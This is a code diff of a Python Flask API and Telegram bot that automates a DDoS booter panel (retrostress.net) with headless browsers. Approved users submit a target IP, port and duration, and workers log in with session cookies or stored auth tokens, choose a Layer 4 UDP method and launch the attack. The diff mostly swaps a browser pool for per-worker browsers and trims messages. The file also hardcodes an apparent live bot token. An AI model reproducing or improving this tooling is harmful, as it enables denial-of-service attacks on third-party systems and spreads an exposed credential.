@@ -1,5 +1,5 @@
 # ============================================================
-#  ⚡ API + TELEGRAM BOT + BROWSER POOL — Full Working
+#  ⚡ API + TELEGRAM BOT — Fast (No Pool)
 # ============================================================
 from flask import Flask, jsonify, request
 from cloakbrowser import launch
@@ -32,8 +32,7 @@ API_NAME       = "krishna father of STTRSERRR"
 BOT_TOKEN = "8987069237:AAGH_ExqtgnBsiKpNrMoPwKslocK7Dx9cjs"
 OWNER_ID  = 7883336006
 
-BROWSER_POOL_SIZE = 8
-SPAM_SLEEP        = 0.05
+SPAM_SLEEP = 0.05
 
 # ============================================================
 #  🌐 SESSIONS
@@ -70,10 +69,6 @@ approved_users = {}
 BOT_TOKENS_FILE = "bot_tokens.json"
 USERS_FILE      = "bot_users.json"
 bot_lock        = threading.Lock()
-
-browser_pool      = queue.Queue()
-browser_pool_lock = threading.Lock()
-browsers_ready    = 0
 
 
 # ============================================================
@@ -209,79 +204,7 @@ def is_approved(uid):
 
 
 # ============================================================
-#  ⚡ BROWSER POOL
-# ============================================================
-def init_browser_pool():
-    global browsers_ready
-    print(f"🚀 Pre-launching {BROWSER_POOL_SIZE} browsers...")
-    t0 = time.time()
-
-    def _launch(idx):
-        global browsers_ready
-        try:
-            b = launch(headless=True)
-            browser_pool.put(b)
-            with browser_pool_lock:
-                browsers_ready += 1
-                print(f"  ✅ Browser {browsers_ready}/{BROWSER_POOL_SIZE} ready")
-        except Exception as e:
-            print(f"  ❌ Browser {idx} failed: {e}")
-
-    threads = []
-    for i in range(BROWSER_POOL_SIZE):
-        t = threading.Thread(target=_launch, args=(i,), daemon=True)
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join(timeout=60)
-
-    print(f"✅ Browser pool ready in {time.time() - t0:.1f}s")
-
-
-def get_browser():
-    try:
-        return browser_pool.get_nowait()
-    except queue.Empty:
-        print("⚠️ Pool empty, launching new browser...")
-        return launch(headless=True)
-
-
-def return_browser(browser):
-    try:
-        for ctx in browser.contexts:
-            try:
-                ctx.close()
-            except Exception:
-                pass
-        browser_pool.put_nowait(browser)
-    except Exception:
-        try:
-            browser.close()
-        except Exception:
-            pass
-
-
-def browser_pool_manager():
-    global browsers_ready
-    while True:
-        try:
-            current = browser_pool.qsize()
-            if current < BROWSER_POOL_SIZE:
-                try:
-                    b = launch(headless=True)
-                    browser_pool.put(b)
-                    with browser_pool_lock:
-                        browsers_ready += 1
-                except Exception:
-                    pass
-        except Exception:
-            pass
-        time.sleep(15)
-
-
-# ============================================================
-#  🎯 METHOD SELECT (Working — no stylesheet block)
+#  🎯 METHOD SELECT
 # ============================================================
 def select_method(page, worker_name="W"):
     for retry in range(3):
@@ -299,10 +222,9 @@ def select_method(page, worker_name="W"):
             }""")
             if not clicked:
                 raise Exception("Layer 4 not found")
-            print(f"[{worker_name}] ✅ Layer 4 clicked")
+            print(f"[{worker_name}] ✅ Layer 4")
             time.sleep(1.0)
 
-            print(f"[{worker_name}] 📂 Browse...")
             clicked = page.evaluate("""() => {
                 const s = document.querySelector('span.app-method-trigger-action');
                 if (s) { s.click(); return 'trigger-action'; }
@@ -315,10 +237,9 @@ def select_method(page, worker_name="W"):
             }""")
             if not clicked:
                 raise Exception("Browse not found")
-            print(f"[{worker_name}] ✅ Browse clicked")
+            print(f"[{worker_name}] ✅ Browse")
             time.sleep(1.5)
 
-            print(f"[{worker_name}] 🔘 UDP filter...")
             clicked = page.evaluate("""() => {
                 const b = document.querySelectorAll('button');
                 for (const x of b) {
@@ -328,10 +249,9 @@ def select_method(page, worker_name="W"):
             }""")
             if not clicked:
                 raise Exception("UDP not found")
-            print(f"[{worker_name}] ✅ UDP clicked")
+            print(f"[{worker_name}] ✅ UDP")
             time.sleep(1.5)
 
-            # Check available options
             available = page.evaluate("""() => {
                 const opts = document.querySelectorAll('button[role="option"]');
                 const results = [];
@@ -359,7 +279,6 @@ def select_method(page, worker_name="W"):
                     time.sleep(0.5)
                     return True
 
-            # Fallback
             clicked = page.evaluate(f"""() => {{
                 const all = document.querySelectorAll('button, div, li, a');
                 for (const x of all) {{
@@ -371,11 +290,11 @@ def select_method(page, worker_name="W"):
                 return false;
             }}""")
             if clicked:
-                print(f"[{worker_name}] ✅ {METHOD} via fallback")
+                print(f"[{worker_name}] ✅ {METHOD} fallback")
                 time.sleep(0.5)
                 return True
 
-            raise Exception(f"{METHOD} not found. Available: {available}")
+            raise Exception(f"{METHOD} not in {available}")
 
         except Exception as e:
             print(f"[{worker_name}] ⚠️ Retry {retry+1}: {e}")
@@ -466,13 +385,12 @@ def spam_attack(page, target_ip, target_port, duration, worker_name="W"):
 
 
 # ============================================================
-#  🔧 PRELOAD WORKER
+#  🔧 PRELOAD WORKER (own browser)
 # ============================================================
 def worker_thread(worker_number):
     global active_attacks, workers_loading, attack_counter
 
     browser           = None
-    context           = None
     loading_decreased = False
 
     session    = get_next_session()
@@ -482,21 +400,19 @@ def worker_thread(worker_number):
         print(f"[Worker-{worker_number}] 🌐 Session {session_id} | Starting...")
         t0 = time.time()
 
-        browser = get_browser()
-        print(f"[Worker-{worker_number}] ⚡ Got browser from pool")
+        # ⚡ Own browser launch (no pool)
+        browser = launch(headless=True)
+        page = browser.new_page()
+        page.set_viewport_size({"width": 1280, "height": 720})
 
-        context = browser.new_context(
-            viewport={"width": 1280, "height": 720}
-        )
-        context.add_cookies(session["cookies"])
-        page = context.new_page()
-
-        # Block ONLY images, fonts, media (NOT stylesheets — panel needs CSS)
+        # Block images/fonts/media (not stylesheets)
         page.route("**/*", lambda route: (
             route.abort() if route.request.resource_type in
                 ["image", "font", "media"]
             else route.continue_()
         ))
+
+        page.context.add_cookies(session["cookies"])
 
         page.goto("https://retrostress.net/panel",
                   wait_until="domcontentloaded", timeout=45000)
@@ -544,17 +460,12 @@ def worker_thread(worker_number):
 
         take_screenshot(page, get_attack_ss_name(atk_num))
 
-        try:
-            context.close()
-        except Exception:
-            pass
-
     except Exception as e:
         print(f"[Worker-{worker_number}] ❌ Error: {e}")
     finally:
         if browser:
             try:
-                return_browser(browser)
+                browser.close()
             except Exception:
                 pass
         with worker_pool_lock:
@@ -570,7 +481,7 @@ def worker_thread(worker_number):
 
 
 # ============================================================
-#  🔑 TOKEN WORKER (bot ke tokens)
+#  🔑 TOKEN WORKER (bot ke tokens — own browser)
 # ============================================================
 def token_worker(token, target_ip, target_port, duration, attack_id):
     browser = None
@@ -580,13 +491,17 @@ def token_worker(token, target_ip, target_port, duration, attack_id):
         print(f"[TokenW-{attack_id}] 🌐 Token {short} | Starting...")
         t0 = time.time()
 
-        browser = get_browser()
-        print(f"[TokenW-{attack_id}] ⚡ Got browser from pool")
+        # ⚡ Own browser
+        browser = launch(headless=True)
+        page = browser.new_page()
+        page.set_viewport_size({"width": 1280, "height": 720})
 
-        context = browser.new_context(
-            viewport={"width": 1280, "height": 720},
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        )
+        # Block images/fonts/media
+        page.route("**/*", lambda route: (
+            route.abort() if route.request.resource_type in
+                ["image", "font", "media"]
+            else route.continue_()
+        ))
 
         cookies = [{
             "name": "auth_token", "value": token,
@@ -594,16 +509,7 @@ def token_worker(token, target_ip, target_port, duration, attack_id):
             "expires": 1794408155.470651,
             "httpOnly": True, "secure": True, "sameSite": "Lax"
         }]
-        context.add_cookies(cookies)
-
-        page = context.new_page()
-
-        # Block ONLY image/font/media (NOT stylesheets)
-        page.route("**/*", lambda route: (
-            route.abort() if route.request.resource_type in
-                ["image", "font", "media"]
-            else route.continue_()
-        ))
+        page.context.add_cookies(cookies)
 
         page.goto("https://retrostress.net/panel",
                   wait_until="domcontentloaded", timeout=45000)
@@ -625,24 +531,19 @@ def token_worker(token, target_ip, target_port, duration, attack_id):
 
         take_screenshot(page, get_attack_ss_name(attack_id))
 
-        try:
-            context.close()
-        except Exception:
-            pass
-
     except Exception as e:
         print(f"[TokenW-{attack_id}] ❌ {e}")
     finally:
         if browser:
             try:
-                return_browser(browser)
+                browser.close()
             except Exception:
                 pass
         print(f"[TokenW-{attack_id}] 🔒 Done")
 
 
 # ============================================================
-#  🔄 POOL MANAGER (preload workers)
+#  🔄 POOL MANAGER
 # ============================================================
 worker_counter      = 0
 worker_counter_lock = threading.Lock()
@@ -667,7 +568,7 @@ def pool_manager():
                         wn = worker_counter
                     t = threading.Thread(target=worker_thread, args=(wn,), daemon=True)
                     t.start()
-                    time.sleep(0.1)
+                    time.sleep(0.5)
         except Exception as e:
             print(f"[Pool] ❌ {e}")
         time.sleep(5)
@@ -732,7 +633,6 @@ def welcome_text(uid):
             f"👤 *{name}* {badge}\n"
             f"🆔 `{uid}`\n\n"
             f"⚙️ Workers: `{pool}/{MAX_PRELOADED}`\n"
-            f"🌐 Browser Pool: `{browser_pool.qsize()}/{BROWSER_POOL_SIZE}`\n"
             f"🔑 My Tokens: `{ntok}`\n\n"
             f"_Choose an option:_")
 
@@ -758,11 +658,8 @@ async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         f"❓ *HELP*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"*Attack:* Button se IP/Port/Duration do\n\n"
         f"*Tokens:* `Label | Token` format me add karo\n\n"
-        f"*Owner Commands:*\n"
-        f"/approve <id> [name]\n"
-        f"/revoke <id>\n"
-        f"/users\n"
-        f"/broadcast <msg>",
+        f"*Owner:*\n"
+        f"/approve <id> [name]\n/revoke <id>\n/users\n/broadcast <msg>",
         parse_mode="Markdown", reply_markup=back_kb())
 
 
@@ -777,12 +674,8 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     with bot_lock:
         ntok = len(bot_tokens.get(str(uid), []))
     await update.message.reply_text(
-        f"📊 *STATUS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🟢 API: Online\n"
-        f"⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
-        f"⏳ Loading: `{loading}`\n"
-        f"🌐 Browser Pool: `{browser_pool.qsize()}/{BROWSER_POOL_SIZE}`\n"
-        f"📡 Sessions: `{len(sessions)}`\n"
+        f"📊 *STATUS*\n\n⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
+        f"⏳ Loading: `{loading}`\n📡 Sessions: `{len(sessions)}`\n"
         f"🔑 My Tokens: `{ntok}`",
         parse_mode="Markdown", reply_markup=back_kb())
 
@@ -801,7 +694,7 @@ async def cmd_approve(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     name = ctx.args[1] if len(ctx.args) > 1 else f"User{tid}"
     approved_users[str(tid)] = {"name": name, "role": "user"}
     save_users()
-    await update.message.reply_text(f"✅ Approved `{tid}` ({name})", parse_mode="Markdown")
+    await update.message.reply_text(f"✅ Approved `{tid}`", parse_mode="Markdown")
     try:
         await ctx.bot.send_message(tid, "✅ *Approved!* Send /start", parse_mode="Markdown")
     except Exception:
@@ -859,7 +752,7 @@ async def do_broadcast(update, ctx, msg):
         except Exception:
             fail += 1
     await update.effective_message.reply_text(
-        f"✅ Done. OK: `{ok}` | Fail: `{fail}`", parse_mode="Markdown")
+        f"✅ OK: `{ok}` | Fail: `{fail}`", parse_mode="Markdown")
 
 
 # ============================================================
@@ -875,7 +768,7 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if data == "req_access":
             try:
                 await ctx.bot.send_message(OWNER_ID,
-                    f"📩 *ACCESS REQ*\n\n{q.from_user.full_name}\n`{uid}`\n"
+                    f"📩 *REQ*\n\n{q.from_user.full_name}\n`{uid}`\n"
                     f"@{q.from_user.username or 'none'}\n\n"
                     f"`/approve {uid} {q.from_user.first_name}`",
                     parse_mode="Markdown")
@@ -894,8 +787,7 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ntok = len(bot_tokens.get(str(uid), []))
         await q.edit_message_text(
             f"📊 *STATUS*\n\n⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
-            f"🌐 Browser Pool: `{browser_pool.qsize()}/{BROWSER_POOL_SIZE}`\n"
-            f"📡 Sessions: `{len(sessions)}`\n🔑 My Tokens: `{ntok}`",
+            f"📡 Sessions: `{len(sessions)}`\n🔑 Tokens: `{ntok}`",
             parse_mode="Markdown", reply_markup=back_kb())
     elif data == "m_help":
         await q.edit_message_text("❓ Send /help", parse_mode="Markdown", reply_markup=back_kb())
@@ -907,7 +799,7 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     elif data == "t_add":
         ctx.user_data["expecting"] = "add_token"
         await q.edit_message_text(
-            "📝 *ADD TOKEN*\n\nSend: `Label | Token`\n\nExample:\n`Manu | 32de18ee...`",
+            "📝 Send: `Label | Token`",
             parse_mode="Markdown", reply_markup=cancel_kb())
     elif data == "t_list":
         with bot_lock:
@@ -915,7 +807,7 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if not toks:
             await q.edit_message_text("📭 No tokens", reply_markup=tokens_kb())
             return
-        text = f"🔑 *MY TOKENS ({len(toks)})*\n\n"
+        text = f"🔑 *TOKENS ({len(toks)})*\n\n"
         for i, t in enumerate(toks, 1):
             text += f"{i}. *{t['label']}*\n`{t['token'][:10]}…{t['token'][-4:]}`\n\n"
         await q.edit_message_text(text, parse_mode="Markdown", reply_markup=tokens_kb())
@@ -943,10 +835,8 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         with worker_pool_lock:
             pool = len(worker_pool)
         await q.edit_message_text(
-            f"🎯 *ATTACK*\n\n"
-            f"🔑 Tokens: `{ntok}`\n"
-            f"⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
-            f"🌐 Browsers: `{browser_pool.qsize()}/{BROWSER_POOL_SIZE}`\n\n"
+            f"🎯 *ATTACK*\n\n🔑 Tokens: `{ntok}`\n"
+            f"⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n\n"
             f"IP, Port, Duration do.",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
@@ -958,8 +848,7 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await q.edit_message_text("🎯 Send *IP*:", parse_mode="Markdown",
                                    reply_markup=cancel_kb())
     elif data == "m_admin" and is_owner(uid):
-        await q.edit_message_text("👑 *ADMIN PANEL*", parse_mode="Markdown",
-                                   reply_markup=admin_kb())
+        await q.edit_message_text("👑 *ADMIN*", parse_mode="Markdown", reply_markup=admin_kb())
     elif data == "ad_users" and is_owner(uid):
         text = f"👥 *USERS ({len(approved_users)})*\n\n"
         for u, d in approved_users.items():
@@ -1072,11 +961,11 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"🚀 *ATTACK LAUNCHED!*\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"🎯 Target: `{ip}:{port}`\n"
-            f"⏱️ Duration: `{d}s`\n"
+            f"🎯 `{ip}:{port}`\n"
+            f"⏱️ `{d}s`\n"
             f"⚡ Tokens: `{len(toks)}`\n"
-            f"🆔 IDs: `{ids}`\n\n"
-            f"_Browser pool use hoga..._",
+            f"🆔 `{ids}`\n\n"
+            f"_Workers spawning..._",
             parse_mode="Markdown", reply_markup=main_kb(uid))
 
     elif expecting == "approve_user" and is_owner(uid):
@@ -1192,9 +1081,7 @@ def status():
         "pool_ready": pool_size, "pool_loading": loading,
         "max_pool": MAX_PRELOADED, "active_attacks": active_attacks,
         "screenshots": ss_count, "sessions": len(sessions),
-        "bot_users": len(approved_users), "bot_tokens": len(bot_tokens),
-        "browser_pool": browser_pool.qsize(),
-        "browser_pool_size": BROWSER_POOL_SIZE
+        "bot_users": len(approved_users), "bot_tokens": len(bot_tokens)
     })
 
 
@@ -1212,8 +1099,7 @@ def home():
     return jsonify({
         "status": "🟢 Online", "api_name": API_NAME,
         "port": PORT, "sessions": len(sessions),
-        "bot_users": len(approved_users),
-        "browser_pool": browser_pool.qsize()
+        "bot_users": len(approved_users)
     })
 
 
@@ -1274,13 +1160,9 @@ if __name__ == '__main__':
     print(f"👑 Owner:         {OWNER_ID}")
     print(f"👥 Approved:      {len(approved_users)}")
     print(f"🚀 Port:          {PORT}")
-    print(f"🌐 Browser Pool:  {BROWSER_POOL_SIZE}")
-
-    init_browser_pool()
 
     threading.Thread(target=pool_manager, daemon=True).start()
-    threading.Thread(target=browser_pool_manager, daemon=True).start()
-    print("🔄 Pool managers started")
+    print("🔄 Pool manager started")
 
     threading.Thread(target=run_flask, daemon=True).start()
     print(f"✅ Flask API on port {PORT}")
